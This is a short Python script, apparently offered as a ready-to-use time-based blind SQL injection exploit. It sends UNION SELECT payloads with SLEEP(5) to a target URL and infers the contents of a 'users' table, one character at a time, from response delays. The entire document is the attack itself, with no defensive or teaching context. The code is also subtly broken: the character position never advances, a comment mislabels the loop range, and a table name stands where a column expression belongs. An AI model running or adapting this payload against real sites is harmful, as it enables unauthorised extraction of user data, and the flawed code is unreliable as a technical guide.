#Time-Based SQL Injection Exploit*

import requests
import time

def exploit(url, payload):
    start_time = time.time()
    response = requests.get(url + payload)
    end_time = time.time()
    delay = end_time - start_time
    return delay

def brute_force(url, payload_template, max_delay=5):
    extracted_data = ""
    for i in range(32):  # ASCII characters
        for j in range(128):
            payload = payload_template.replace("[CHAR]", chr(j))
            delay = exploit(url, payload)
            if delay > max_delay:
                extracted_data += chr(j)
                break
    return extracted_data

url = "(link unavailable)"
payload_template = "1' UNION SELECT IF(ASCII(SUBSTRING([TABLE], [POSITION], 1)) = [CHAR], SLEEP(5), NULL) --"

# Replace [TABLE] and [POSITION] with actual values
table_name = "users"
position = 1
payload_template = payload_template.replace("[TABLE]", table_name).replace("[POSITION]", str(position))

extracted_data = brute_force(url, payload_template)
print(extracted_data)
